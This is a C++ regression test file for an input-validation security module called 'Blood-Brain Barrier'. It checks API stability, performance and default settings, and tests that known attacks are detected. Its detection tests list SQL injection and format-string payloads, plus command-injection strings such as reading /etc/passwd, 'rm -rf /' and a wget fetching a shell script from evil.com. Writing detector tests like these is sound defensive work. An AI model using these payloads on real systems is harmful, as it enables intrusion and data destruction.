/**
 * @file test_bbb_regression.cpp
 * @brief Regression tests for Blood-Brain Barrier security system (NIMCP)
 *
 * Tests to ensure backward compatibility and consistent behavior:
 * - API backward compatibility
 * - Consistent results for same inputs
 * - Performance benchmarks
 * - Default configuration stability
 * - Known attack pattern detection
 *
 * REGRESSION FOCUS:
 * 1. API contracts remain stable
 * 2. Detection patterns are not degraded
 * 3. Performance stays within bounds
 * 4. Default values remain unchanged
 */

#include "test_helpers.h"

// Headers have their own extern "C" guards
#include "security/nimcp_blood_brain_barrier.h"

#include <cstring>
#include <chrono>
#include <vector>
#include <string>

namespace {

//=============================================================================
// Test Fixture
//=============================================================================

class BBBRegressionTest : public ::testing::Test {
   protected:
    void SetUp() override
    {
        config = bbb_default_config();
        system = bbb_system_create(&config);
        ASSERT_NE(system, nullptr);
        ASSERT_TRUE(bbb_system_set_enabled(system, true));
    }

    void TearDown() override
    {
        // Clear any signing key that was set during the test
        bbb_clear_signing_key();

        if (system) {
            bbb_system_destroy(system);
            system = nullptr;
        }
    }

    // Helper to measure validation performance
    double measure_validation_time_ms(const char* input, int iterations)
    {
        auto start = std::chrono::high_resolution_clock::now();

        for (int i = 0; i < iterations; i++) {
            bbb_validation_result_t result;
            bbb_validate_string(system, input, &result);
        }

        auto end = std::chrono::high_resolution_clock::now();
        std::chrono::duration<double, std::milli> elapsed = end - start;
        return elapsed.count();
    }

    bbb_config_t config;
    bbb_system_t system;
};

//=============================================================================
// API Backward Compatibility Tests
//=============================================================================

TEST_F(BBBRegressionTest, APICreateDestroy)
{
    // API: bbb_system_create() should accept NULL for defaults
    bbb_system_t sys1 = bbb_system_create(nullptr);
    EXPECT_NE(sys1, nullptr);

    // API: bbb_system_create() should accept config pointer
    bbb_config_t cfg = bbb_default_config();
    bbb_system_t sys2 = bbb_system_create(&cfg);
    EXPECT_NE(sys2, nullptr);

    // API: bbb_system_destroy() should handle valid pointers
    bbb_system_destroy(sys1);
    bbb_system_destroy(sys2);

    // API: bbb_system_destroy() should handle NULL safely
    bbb_system_destroy(nullptr);
    SUCCEED();
}

TEST_F(BBBRegressionTest, APIEnableDisable)
{
    // API: set_enabled returns bool
    bool result1 = bbb_system_set_enabled(system, true);
    EXPECT_TRUE(result1);

    bool result2 = bbb_system_set_enabled(system, false);
    EXPECT_TRUE(result2);

    // API: is_enabled returns bool
    bool enabled = bbb_system_is_enabled(system);
    EXPECT_FALSE(enabled);

    // API: NULL handling
    EXPECT_FALSE(bbb_system_set_enabled(nullptr, true));
    EXPECT_FALSE(bbb_system_is_enabled(nullptr));
}

TEST_F(BBBRegressionTest, APIValidationResultStructure)
{
    bbb_validation_result_t result;
    memset(&result, 0xFF, sizeof(result));  // Fill with garbage

    bool valid = bbb_validate_string(system, "test", &result);

    // API: result structure should be properly populated
    EXPECT_TRUE(valid);
    EXPECT_TRUE(result.valid);
    EXPECT_EQ(result.threat, BBB_THREAT_NONE);
    EXPECT_EQ(result.severity, BBB_SEVERITY_NONE);
    // reason should be a valid string (not garbage)
    EXPECT_LE(strlen(result.reason), sizeof(result.reason));
}

TEST_F(BBBRegressionTest, APIStatisticsStructure)
{
    bbb_statistics_t stats;
    memset(&stats, 0xFF, sizeof(stats));  // Fill with garbage

    bool success = bbb_system_get_statistics(system, &stats);

    // API: statistics structure should be properly populated
    EXPECT_TRUE(success);
    EXPECT_EQ(stats.total_validations, 0u);
    EXPECT_EQ(stats.threats_detected, 0u);
    EXPECT_EQ(stats.threats_blocked, 0u);
}

TEST_F(BBBRegressionTest, APIThreatReportStructure)
{
    bbb_threat_report_t report = bbb_report_threat(
        system,
        BBB_THREAT_SQL_INJECTION,
        BBB_SEVERITY_HIGH,
        "Test threat",
        nullptr,
        nullptr,
        0
    );

    // API: threat report structure fields
    EXPECT_EQ(report.type, BBB_THREAT_SQL_INJECTION);
    EXPECT_EQ(report.severity, BBB_SEVERITY_HIGH);
    EXPECT_GT(report.timestamp, 0u);
    EXPECT_LE(strlen(report.description), sizeof(report.description));
}

TEST_F(BBBRegressionTest, APIEnumValuesUnchanged)
{
    // Threat types - values must not change for backward compatibility
    EXPECT_EQ(BBB_THREAT_NONE, 0);
    EXPECT_EQ(BBB_THREAT_BUFFER_OVERFLOW, 1);
    EXPECT_EQ(BBB_THREAT_FORMAT_STRING, 2);
    EXPECT_EQ(BBB_THREAT_INTEGER_OVERFLOW, 3);
    EXPECT_EQ(BBB_THREAT_SQL_INJECTION, 4);
    EXPECT_EQ(BBB_THREAT_CODE_INJECTION, 5);
    EXPECT_EQ(BBB_THREAT_SHELLCODE, 6);
    EXPECT_EQ(BBB_THREAT_ROP_CHAIN, 7);
    EXPECT_EQ(BBB_THREAT_INVALID_SIGNATURE, 8);
    EXPECT_EQ(BBB_THREAT_MEMORY_VIOLATION, 9);
    EXPECT_EQ(BBB_THREAT_UNAUTHORIZED_ACCESS, 10);

    // Severity levels
    EXPECT_EQ(BBB_SEVERITY_NONE, 0);
    EXPECT_EQ(BBB_SEVERITY_LOW, 1);
    EXPECT_EQ(BBB_SEVERITY_MEDIUM, 2);
    EXPECT_EQ(BBB_SEVERITY_HIGH, 3);
    EXPECT_EQ(BBB_SEVERITY_CRITICAL, 4);

    // Actions
    EXPECT_EQ(BBB_ACTION_ALLOW, 0);
    EXPECT_EQ(BBB_ACTION_LOG, 1);
    EXPECT_EQ(BBB_ACTION_BLOCK, 2);
    EXPECT_EQ(BBB_ACTION_QUARANTINE, 3);
    EXPECT_EQ(BBB_ACTION_TERMINATE, 4);
    EXPECT_EQ(BBB_ACTION_LOCKDOWN, 5);
}

//=============================================================================
// Consistent Results Tests
//=============================================================================

TEST_F(BBBRegressionTest, ConsistentSafeStringValidation)
{
    const char* safe_inputs[] = {
        "Hello, World!",
        "This is a test",
        "12345",
        "user@example.com",
        "normal_identifier_123",
        "path/to/file.txt",
        "{\"key\": \"value\"}",
        "SELECT name FROM users WHERE id = 1",  // Legitimate SQL (not injection)
    };

    for (const char* input : safe_inputs) {
        bbb_validation_result_t result1, result2;

        bool valid1 = bbb_validate_string(system, input, &result1);
        bool valid2 = bbb_validate_string(system, input, &result2);

        // Same input should produce same result
        EXPECT_EQ(valid1, valid2) << "Inconsistent result for: " << input;
        EXPECT_EQ(result1.valid, result2.valid);
        EXPECT_EQ(result1.threat, result2.threat);
    }
}

TEST_F(BBBRegressionTest, ConsistentThreatDetection)
{
    const char* threats[] = {
        "'; DROP TABLE users; --",
        "1 UNION SELECT * FROM passwords",
        "%n%n%n%n",
        "%s%s%s%s%s",
        "'; DELETE FROM accounts WHERE '1'='1",
    };

    for (const char* input : threats) {
        bbb_validation_result_t result1, result2;

        bool valid1 = bbb_validate_string(system, input, &result1);
        bool valid2 = bbb_validate_string(system, input, &result2);

        // Same threat should be detected consistently
        EXPECT_EQ(valid1, valid2) << "Inconsistent detection for: " << input;
        EXPECT_EQ(result1.threat, result2.threat);
        EXPECT_EQ(result1.severity, result2.severity);
    }
}

TEST_F(BBBRegressionTest, ConsistentHashCalculation)
{
    const char* data = "consistent hash test data";
    uint8_t hash1[32], hash2[32], hash3[32];

    // Multiple hash calculations should produce identical results
    EXPECT_TRUE(bbb_calculate_hash(data, strlen(data), hash1));
    EXPECT_TRUE(bbb_calculate_hash(data, strlen(data), hash2));
    EXPECT_TRUE(bbb_calculate_hash(data, strlen(data), hash3));

    EXPECT_EQ(memcmp(hash1, hash2, 32), 0);
    EXPECT_EQ(memcmp(hash2, hash3, 32), 0);
}

TEST_F(BBBRegressionTest, ConsistentSignatureVerification)
{
    // Configure signing key (required before signing)
    static const uint8_t test_key[32] = {
        0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
        0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10,
        0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
        0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20
    };
    ASSERT_TRUE(bbb_set_signing_key(test_key, sizeof(test_key)));

    const char* code = "function test() { return 42; }";
    uint8_t signature[512];

    ssize_t sig_len = bbb_sign_code(system, code, strlen(code), signature, sizeof(signature));
    ASSERT_GT(sig_len, 0);

    // Verify multiple times - should always succeed
    for (int i = 0; i < 10; i++) {
        bool valid = bbb_verify_signature(system, code, strlen(code), signature, sig_len);
        EXPECT_TRUE(valid) << "Verification failed on iteration " << i;
    }
}

//=============================================================================
// Performance Benchmark Tests
//=============================================================================

TEST_F(BBBRegressionTest, PerformanceStringValidation)
{
    const int NUM_ITERATIONS = 1000;
    const double MAX_TIME_MS = 1000.0;  // 1 second for 1000 validations

    double elapsed = measure_validation_time_ms("safe input string for performance test", NUM_ITERATIONS);

    EXPECT_LT(elapsed, MAX_TIME_MS)
        << "Performance regression: " << NUM_ITERATIONS << " validations took "
        << elapsed << "ms (max: " << MAX_TIME_MS << "ms)";
}

TEST_F(BBBRegressionTest, PerformanceThreatDetection)
{
    const int NUM_ITERATIONS = 1000;
    const double MAX_TIME_MS = 1500.0;  // Slightly more time for threat detection

    double elapsed = measure_validation_time_ms("'; DROP TABLE users; --", NUM_ITERATIONS);

    EXPECT_LT(elapsed, MAX_TIME_MS)
        << "Performance regression: " << NUM_ITERATIONS << " threat detections took "
        << elapsed << "ms (max: " << MAX_TIME_MS << "ms)";
}

TEST_F(BBBRegressionTest, PerformanceHashCalculation)
{
    const int NUM_ITERATIONS = 1000;
    const double MAX_TIME_MS = 500.0;

    const char* data = "data to hash for performance benchmark";
    uint8_t hash[32];

    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        bbb_calculate_hash(data, strlen(data), hash);
    }

    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double, std::milli> elapsed = end - start;

    EXPECT_LT(elapsed.count(), MAX_TIME_MS)
        << "Performance regression: " << NUM_ITERATIONS << " hash calculations took "
        << elapsed.count() << "ms (max: " << MAX_TIME_MS << "ms)";
}

TEST_F(BBBRegressionTest, PerformanceMemoryAccessCheck)
{
    const int NUM_ITERATIONS = 10000;
    const double MAX_TIME_MS = 500.0;

    char buffer[1024];
    uint32_t region_id = bbb_register_memory_region(system, buffer, sizeof(buffer), false);
    ASSERT_GT(region_id, 0u);

    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        bbb_check_memory_access(system, buffer, 100, false);
    }

    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double, std::milli> elapsed = end - start;

    EXPECT_LT(elapsed.count(), MAX_TIME_MS)
        << "Performance regression: " << NUM_ITERATIONS << " memory checks took "
        << elapsed.count() << "ms (max: " << MAX_TIME_MS << "ms)";

    bbb_unregister_memory_region(system, region_id);
}

TEST_F(BBBRegressionTest, PerformanceAccessControl)
{
    const int NUM_ITERATIONS = 10000;
    const double MAX_TIME_MS = 500.0;

    bbb_subject_t subject = {1, 5, 0x01, 0x01};
    bbb_object_t object = {1, 3, 0x01, 0x01};

    ASSERT_TRUE(bbb_register_subject(system, &subject));
    ASSERT_TRUE(bbb_register_object(system, &object));

    auto start = std::chrono::high_resolution_clock::now();

    for (int i = 0; i < NUM_ITERATIONS; i++) {
        bbb_check_access(system, &subject, &object, 1);
    }

    auto end = std::chrono::high_resolution_clock::now();
    std::chrono::duration<double, std::milli> elapsed = end - start;

    EXPECT_LT(elapsed.count(), MAX_TIME_MS)
        << "Performance regression: " << NUM_ITERATIONS << " access checks took "
        << elapsed.count() << "ms (max: " << MAX_TIME_MS << "ms)";
}

//=============================================================================
// Default Configuration Tests
//=============================================================================

TEST_F(BBBRegressionTest, DefaultInputConfigUnchanged)
{
    bbb_config_t cfg = bbb_default_config();

    // These defaults must not change to maintain backward compatibility
    EXPECT_TRUE(cfg.input.validate_strings);
    EXPECT_TRUE(cfg.input.validate_integers);
    EXPECT_TRUE(cfg.input.validate_pointers);

    // Max string length should be reasonable (at least 1KB, at most 1MB)
    EXPECT_GE(cfg.input.max_string_length, 1024u);
    EXPECT_LE(cfg.input.max_string_length, 1048576u);

    // Max array size should be reasonable
    EXPECT_GE(cfg.input.max_array_size, 1024u);
}

TEST_F(BBBRegressionTest, DefaultSigningConfigUnchanged)
{
    bbb_config_t cfg = bbb_default_config();

    // Code signing should be enabled by default
    EXPECT_TRUE(cfg.signing.verify_on_load);
}

TEST_F(BBBRegressionTest, DefaultMemoryConfigUnchanged)
{
    bbb_config_t cfg = bbb_default_config();

    // Memory protection should be enabled by default
    EXPECT_TRUE(cfg.memory.enable_stack_canaries);
    EXPECT_TRUE(cfg.memory.enable_heap_guards);

    // Guard page size should be reasonable (page size multiple)
    EXPECT_GE(cfg.memory.guard_page_size, 4096u);
}

TEST_F(BBBRegressionTest, DefaultAccessConfigUnchanged)
{
    bbb_config_t cfg = bbb_default_config();

    // Capability-based access control should be enabled
    EXPECT_TRUE(cfg.access.enable_capability);

    // Max privilege level should be reasonable
    EXPECT_GE(cfg.access.max_privilege_level, 10u);
}

TEST_F(BBBRegressionTest, DefaultActionIsBlock)
{
    bbb_config_t cfg = bbb_default_config();

    // Default action should be BLOCK or higher (not ALLOW or LOG)
    EXPECT_GE(cfg.default_action, BBB_ACTION_BLOCK);
}

//=============================================================================
// Known Attack Pattern Tests
//=============================================================================

TEST_F(BBBRegressionTest, DetectSQLInjectionPatterns)
{
    // These patterns MUST always be detected
    const char* sql_injections[] = {
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR 1=1--",
        "'; DELETE FROM accounts; --",
        "1 UNION SELECT * FROM passwords",
        "' UNION SELECT username, password FROM users--",
        "admin'--",
        "1; INSERT INTO users VALUES('hacker', 'password')",
        "'; EXEC xp_cmdshell('cmd'); --",
        "' OR EXISTS(SELECT * FROM users)--",
    };

    for (const char* injection : sql_injections) {
        bbb_validation_result_t result;
        bool valid = bbb_validate_string(system, injection, &result);

        EXPECT_FALSE(valid) << "Failed to detect SQL injection: " << injection;
        EXPECT_EQ(result.threat, BBB_THREAT_SQL_INJECTION)
            << "Wrong threat type for: " << injection;
    }
}

TEST_F(BBBRegressionTest, DetectFormatStringPatterns)
{
    // These patterns MUST always be detected
    const char* format_strings[] = {
        "%n%n%n%n",
        "%s%s%s%s",
        "%x%x%x%x",
        "AAAA%08x.%08x.%08x.%08x",
        "%p%p%p%p",
        "%.100000s",
        "%99999999s",
        "%.99999d",
    };

    for (const char* fs : format_strings) {
        bbb_validation_result_t result;
        bool valid = bbb_validate_string(system, fs, &result);

        EXPECT_FALSE(valid) << "Failed to detect format string: " << fs;
        EXPECT_EQ(result.threat, BBB_THREAT_FORMAT_STRING)
            << "Wrong threat type for: " << fs;
    }
}

TEST_F(BBBRegressionTest, DetectCodeInjectionPatterns)
{
    // Common code injection patterns
    const char* code_injections[] = {
        "; ls -la",
        "| cat /etc/passwd",
        "` rm -rf / `",
        "$(whoami)",
        "&& wget http://evil.com/shell.sh",
    };

    for (const char* injection : code_injections) {
        bbb_validation_result_t result;
        bool valid = bbb_validate_string(system, injection, &result);

        // Should detect as some form of injection
        if (!valid) {
            EXPECT_NE(result.threat, BBB_THREAT_NONE)
                << "Threat should be identified for: " << injection;
        }
    }
}

TEST_F(BBBRegressionTest, AllowLegitimateInput)
{
    // These should NOT be flagged as threats
    const char* legitimate[] = {
        "Hello, World!",
        "This is a normal sentence.",
        "user@example.com",
        "12345",
        "+1-555-123-4567",
        "https://example.com/page?id=123",
        "John O'Brien",  // Legitimate apostrophe
        "SELECT name FROM users",  // Legitimate SQL (context-dependent)
        "The percentage is 50%",  // Legitimate percent sign
        "Price: $19.99",
    };

    for (const char* input : legitimate) {
        bbb_validation_result_t result;
        bool valid = bbb_validate_string(system, input, &result);

        EXPECT_TRUE(valid) << "False positive for: " << input;
        EXPECT_EQ(result.threat, BBB_THREAT_NONE)
            << "Should not detect threat in: " << input;
    }
}

//=============================================================================
// Boundary Condition Regression Tests
//=============================================================================

TEST_F(BBBRegressionTest, EmptyStringHandling)
{
    bbb_validation_result_t result;
    bool valid = bbb_validate_string(system, "", &result);

    // Empty string should be valid (not a threat)
    EXPECT_TRUE(valid);
    EXPECT_TRUE(result.valid);
}

TEST_F(BBBRegressionTest, MaxLengthStringHandling)
{
    bbb_config_t cfg = bbb_default_config();
    std::string long_string(cfg.input.max_string_length, 'A');

    bbb_validation_result_t result;
    bool valid = bbb_validate_string(system, long_string.c_str(), &result);

    // At exactly max length, should still be valid
    EXPECT_TRUE(valid);
}

TEST_F(BBBRegressionTest, OverMaxLengthStringHandling)
{
    bbb_config_t cfg = bbb_default_config();
    std::string long_string(cfg.input.max_string_length + 1, 'A');

    bbb_validation_result_t result;
    bool valid = bbb_validate_string(system, long_string.c_str(), &result);

    // Over max length should be rejected
    EXPECT_FALSE(valid);
    EXPECT_EQ(result.threat, BBB_THREAT_BUFFER_OVERFLOW);
}

TEST_F(BBBRegressionTest, IntegerBoundaryValues)
{
    bbb_validation_result_t result;

    // Zero should always be valid
    EXPECT_TRUE(bbb_validate_integer(system, 0, &result));

    // INT64_MAX and INT64_MIN handling should be consistent
    bool max_valid = bbb_validate_integer(system, INT64_MAX, &result);
    bool min_valid = bbb_validate_integer(system, INT64_MIN, &result);

    // Both should be handled consistently (both valid or both invalid)
    // depending on configuration
}

TEST_F(BBBRegressionTest, NullPointerHandling)
{
    bbb_validation_result_t result;

    // NULL pointers should be consistently rejected
    EXPECT_FALSE(bbb_validate_pointer(system, nullptr, 100, &result));
    EXPECT_FALSE(bbb_validate_string(system, nullptr, &result));
    EXPECT_FALSE(bbb_validate_input(system, nullptr, 100, &result));
}

//=============================================================================
// State Consistency Tests
//=============================================================================

TEST_F(BBBRegressionTest, StatisticsMonotonicallyIncreasing)
{
    bbb_statistics_t stats1, stats2;

    EXPECT_TRUE(bbb_system_get_statistics(system, &stats1));

    bbb_validation_result_t result;
    bbb_validate_string(system, "test", &result);

    EXPECT_TRUE(bbb_system_get_statistics(system, &stats2));

    // Counters should never decrease
    EXPECT_GE(stats2.total_validations, stats1.total_validations);
    EXPECT_GE(stats2.threats_detected, stats1.threats_detected);
}

TEST_F(BBBRegressionTest, ResetStatisticsToZero)
{
    // Perform some operations
    bbb_validation_result_t result;
    bbb_validate_string(system, "test", &result);
    bbb_validate_string(system, "'; DROP TABLE; --", &result);

    bbb_system_reset_statistics(system);

    bbb_statistics_t stats;
    EXPECT_TRUE(bbb_system_get_statistics(system, &stats));

    // All counters should be zero after reset
    EXPECT_EQ(stats.total_validations, 0u);
    EXPECT_EQ(stats.threats_detected, 0u);
    EXPECT_EQ(stats.threats_blocked, 0u);
}

TEST_F(BBBRegressionTest, ThreatReportOrdering)
{
    // Report multiple threats
    for (int i = 0; i < 5; i++) {
        bbb_report_threat(system, BBB_THREAT_SQL_INJECTION, BBB_SEVERITY_MEDIUM,
                          "Test threat", nullptr, nullptr, 0);
    }

    bbb_threat_report_t reports[10];
    size_t count = bbb_get_threat_reports(system, reports, 10);

    EXPECT_GE(count, 5u);

    // Timestamps should be non-decreasing (chronological order)
    for (size_t i = 1; i < count; i++) {
        EXPECT_GE(reports[i].timestamp, reports[i-1].timestamp);
    }
}

}  // anonymous namespace
